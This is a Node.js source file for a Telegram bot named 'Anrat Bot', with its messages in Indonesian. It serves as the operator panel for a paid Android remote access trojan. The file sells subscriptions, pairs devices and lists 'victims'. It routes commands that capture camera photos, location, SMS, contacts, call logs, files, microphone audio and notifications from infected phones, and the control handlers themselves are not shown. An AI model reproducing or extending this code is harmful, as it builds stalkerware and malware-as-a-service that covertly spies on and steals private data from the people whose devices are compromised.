require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const mysql = require('mysql2');
const crypto = require('crypto');
const axios = require('axios');

const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });

const db = mysql.createPool({
  host: process.env.DB_HOST,
  user: process.env.DB_USER,
  password: process.env.DB_PASSWORD,
  database: process.env.DB_NAME
});

bot.on("polling_error", (error) => {
    console.error("Polling error:", error);
});

// =====================================================
// HELPER FUNCTIONS
// =====================================================
function requireAuth(chatId, callback) {
  const query = `
    SELECT u.*, s.chat_id, s.session_token, s.session_expiry
    FROM sessions s
    JOIN users u ON s.user_id = u.id
    WHERE s.chat_id = ? 
    AND s.session_expiry > NOW()
  `;
  
  db.query(query, [chatId], (err, results) => {
    if (err) {
      console.error('Auth check error:', err);
      callback(false, 'Database error', null);
      return;
    }
    
    if (results.length === 0) {
      callback(false, '❌ Anda belum login!\n\n🔐 Gunakan /login untuk masuk terlebih dahulu.', null);
      return;
    }
    
    callback(true, null, results[0]);
  });
}

// Export untuk digunakan di handler lain
module.exports.bot = bot;
module.exports.db = db;
module.exports.requireAuth = requireAuth;

// Import handlers SETELAH export
const authHandler = require('./handlers/authHandler');
const subscriptionHandler = require('./handlers/subscriptionHandler.js');
const deviceHandler = require('./handlers/deviceHandler.js');
const controlHandler = require('./handlers/controlHandler.js');

// =====================================================
// AUTO CLEANUP
// =====================================================
setInterval(() => {
  const query = `
    UPDATE subscriptions 
    SET status = 'rejected' 
    WHERE status = 'pending' 
    AND order_expires_at < NOW()
  `;
  
  db.query(query, (err, result) => {
    if (err) console.error('Error auto-rejecting expired orders:', err);
    if (result && result.affectedRows > 0) {
      console.log(`Auto-rejected ${result.affectedRows} expired orders`);
    }
  });
}, 60000);

setInterval(() => {
  const query = `DELETE FROM sessions WHERE session_expiry < NOW()`;
  
  db.query(query, (err, result) => {
    if (err) console.error('Error cleaning expired sessions:', err);
    if (result && result.affectedRows > 0) {
      console.log(`🔒 Cleaned ${result.affectedRows} expired sessions`);
    }
  });
}, 60000);

// =====================================================
// COMMAND ROUTING
// =====================================================

// Public commands
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const welcomeMsg = `
🤖 *Selamat datang di Anrat Bot!*

Gunakan command berikut:

🔓 *Public:*
/info - Informasi bot
/adduser - Tambah user baru

🔐 *Auth:*
/login - Login ke akun
/logout - Keluar dari device ini
/mysessions - Lihat active sessions

💳 *Subscription:*
/sub - Lihat paket subscription
/buy - Beli subscription
/mysub - Lihat subscription aktif
/mystatus - Cek status order
/activate - Aktivasi kode

📱 *Device Management:*
/pair - Generate pairing code
/mydevices - Lihat semua device
/rename - Ubah nama device
/remove - Hapus device

🎮 *Device Control:*
/victims - Lihat device online
/camera - Ambil foto
/location - Dapatkan lokasi
/sms - Kelola SMS
/contacts - Lihat kontak
/calls - Lihat riwayat panggilan
/files - Kelola file
/mic - Record audio
/notif - Kelola notifikasi

📱 *Cara penggunaan:*
1. Login dengan /login
2. Pilih paket dengan /sub
3. Beli dengan /buy
4. Kirim bukti bayar dengan /confirm
5. Aktivasi dengan /activate
6. Pair device dengan /pair
7. Control device dengan /victims
`;
  bot.sendMessage(chatId, welcomeMsg, { parse_mode: "Markdown" });
});

bot.onText(/\/info/, (msg) => {
  const chatId = msg.chat.id;
  const keyboard = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🇮🇩 Bahasa Indonesia", callback_data: "lang_id" }],
        [{ text: "🇬🇧 English", callback_data: "lang_en" }]
      ]
    }
  };
  bot.sendMessage(chatId, "Pilih bahasa / Choose language:", keyboard);
});

// Auth commands
bot.onText(/\/adduser/, authHandler.addUser);
bot.onText(/\/login/, authHandler.login);
bot.onText(/\/logout/, authHandler.logout);
bot.onText(/\/cek/, authHandler.checkAuth);
bot.onText(/\/mysessions/, authHandler.mySessions);

// Subscription commands
bot.onText(/\/sub/, subscriptionHandler.showPlans);
bot.onText(/\/buy (.+)/, subscriptionHandler.buySubscription);
bot.onText(/\/confirm/, subscriptionHandler.confirmPayment);
bot.onText(/\/activate (.+)/, subscriptionHandler.activateCode);
bot.onText(/\/mystatus/, subscriptionHandler.myStatus);
bot.onText(/\/mysub/, subscriptionHandler.mySubscription);

// Device management commands
bot.onText(/\/pair/, deviceHandler.generatePairingCode);
bot.onText(/\/mydevices/, deviceHandler.listDevices);
bot.onText(/\/rename/, deviceHandler.renameDevice);
bot.onText(/\/remove/, deviceHandler.removeDevice);

// Device control commands
bot.onText(/\/victims/, controlHandler.listOnlineVictims);
bot.onText(/\/camera/, controlHandler.cameraControl);
bot.onText(/\/location/, controlHandler.locationControl);
bot.onText(/\/sms/, controlHandler.smsControl);
bot.onText(/\/contacts/, controlHandler.contactsControl);
bot.onText(/\/calls/, controlHandler.callsControl);
bot.onText(/\/files/, controlHandler.filesControl);
bot.onText(/\/mic/, controlHandler.micControl);
bot.onText(/\/notif/, controlHandler.notificationControl);

// Callback query handler
bot.on("callback_query", (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;

  if (data === "lang_id") {
    bot.sendMessage(chatId, `
Selamat datang di Bot Telegram!
Gunakan /start untuk melihat semua command.
    `);
  } else if (data === "lang_en") {
    bot.sendMessage(chatId, `
Welcome to Telegram Bot!
Use /start to see all commands.
    `);
  }
  
  // Handle device control callbacks
  if (data.startsWith('device_') || data.startsWith('sms_') || data.startsWith('files_') || data.startsWith('notif_')) {
    controlHandler.handleDeviceCallback(query);
  }
  
  bot.answerCallbackQuery(query.id);
});

console.log("🤖 Bot berjalan...");
console.log("🔒 Authentication middleware aktif!");
console.log("⏰ Auto-cleanup aktif!");
console.log("🎮 Device control ready!");
console.log("📱 All endpoints integrated!");
